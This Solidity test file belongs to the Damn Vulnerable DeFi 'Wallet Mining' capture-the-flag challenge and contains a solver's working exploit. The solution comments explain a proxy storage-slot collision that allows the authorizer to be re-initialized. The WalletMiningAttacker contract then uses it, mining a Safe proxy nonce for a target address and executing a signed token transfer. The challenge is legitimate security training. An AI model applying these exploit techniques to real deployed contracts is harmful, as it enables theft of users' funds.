// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * 
         * 1. STORAGE COLLISION: The TransparentProxy stores `upgrader` at slot 0,
         *    but AuthorizerUpgradeable stores `needsInit` at slot 0 too!
         *    After deployment, slot 0 = upgrader address (non-zero).
         *    So `needsInit != 0` check passes and we can call init() again!
         * 
         * 2. NONCE MINING: We need to find the saltNonce that will deploy a Safe
         *    proxy to USER_DEPOSIT_ADDRESS (0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496).
         *
         * EXPLOIT STRATEGY:
         * 1. Re-initialize the authorizer to add ourselves as authorized ward
         * 2. Find the nonce that creates a Safe at USER_DEPOSIT_ADDRESS
         * 3. Deploy the Safe via walletDeployer.drop() to get the reward
         * 4. Execute a transaction from the Safe to transfer tokens to user
         * 5. Send reward to the ward account
         */

        // Pre-compute the transfer call
        bytes memory transferCall = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));

        // Pre-compute the Safe transaction hash (we know the Safe will be at USER_DEPOSIT_ADDRESS)
        // Using Safe's EIP-712 signature scheme
        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
        
        bytes32 domainSeparator = keccak256(
            abi.encode(
                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH
                block.chainid,
                USER_DEPOSIT_ADDRESS
            )
        );

        bytes32 safeTxHash = keccak256(
            abi.encode(
                SAFE_TX_TYPEHASH,
                address(token),     // to
                0,                  // value
                keccak256(transferCall), // data hash
                uint8(Enum.Operation.Call), // operation
                0,                  // safeTxGas
                0,                  // baseGas  
                0,                  // gasPrice
                address(0),         // gasToken
                address(0),         // refundReceiver
                0                   // nonce (first tx)
            )
        );

        bytes32 txHash = keccak256(
            abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash)
        );

        // Sign the transaction hash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Deploy attacker contract that executes everything
        new WalletMiningAttacker(
            walletDeployer,
            authorizer,
            proxyFactory,
            singletonCopy,
            token,
            user,
            ward,
            transferCall,
            signature
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

/**
 * @notice Attacker contract that exploits the storage collision vulnerability
 */
contract WalletMiningAttacker {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    constructor(
        WalletDeployer walletDeployer,
        AuthorizerUpgradeable authorizer,
        SafeProxyFactory proxyFactory,
        Safe singletonCopy,
        DamnValuableToken token,
        address user,
        address ward,
        bytes memory transferCall,
        bytes memory signature
    ) {
        // Step 1: Exploit storage collision to re-initialize authorizer
        _exploitAuthorizer(authorizer);

        // Step 2: Build initializer and find nonce
        bytes memory initializer = _buildInitializer(user);
        uint256 saltNonce = _findNonce(proxyFactory, singletonCopy, initializer);

        // Step 3: Deploy the Safe via walletDeployer.drop()
        require(walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce), "drop failed");

        // Step 4: Execute transfer from the Safe
        _executeTransfer(token, transferCall, signature);

        // Step 5: Send reward to ward
        token.transfer(ward, token.balanceOf(address(this)));
    }

    function _exploitAuthorizer(AuthorizerUpgradeable authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(wards, aims);
    }

    function _buildInitializer(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        
        return abi.encodeCall(
            Safe.setup,
            (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
        );
    }

    function _findNonce(
        SafeProxyFactory proxyFactory,
        Safe singletonCopy,
        bytes memory initializer
    ) internal pure returns (uint256) {
        bytes32 initHash = keccak256(initializer);
        address factory = address(proxyFactory);
        address singleton = address(singletonCopy);
        
        for (uint256 i = 0; i < 100; i++) {
            bytes32 salt = keccak256(abi.encodePacked(initHash, i));
            if (_computeAddress(factory, salt, singleton) == USER_DEPOSIT_ADDRESS) {
                return i;
            }
        }
        revert("nonce not found");
    }

    function _computeAddress(
        address factory,
        bytes32 salt,
        address singleton
    ) internal pure returns (address) {
        bytes memory proxyCode = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(singleton))
        );
        
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff), factory, salt, keccak256(proxyCode)
        )))));
    }

    function _executeTransfer(
        DamnValuableToken token,
        bytes memory transferCall,
        bytes memory signature
    ) internal {
        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
            address(token),
            0,
            transferCall,
            Enum.Operation.Call,
            0, 0, 0,
            address(0),
            payable(address(0)),
            signature
        );
    }
}
